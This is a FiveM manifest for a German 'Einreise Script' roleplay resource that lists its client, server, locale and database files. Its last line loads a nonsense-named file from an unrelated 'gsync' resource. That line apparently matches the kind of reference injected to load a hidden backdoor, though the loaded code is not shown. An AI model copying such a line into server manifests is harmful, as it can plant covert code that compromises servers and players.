fx_version 'adamant'
games { 'gta5' }

author 'Craniax - edited by Musiker15'
description 'Einreise Script'
version '2.0'

client_scripts {
    '@es_extended/locale.lua',
	'locales/en.lua',
	'locales/de.lua',
    'config.lua',
	'client.lua'
}

server_script {
    '@mysql-async/lib/MySQL.lua',
    '@es_extended/locale.lua',
	'locales/en.lua',
	'locales/de.lua',
    'config.lua',
    'server.lua'
}

client_script '@gsync/xDxDxDxDxD.lua'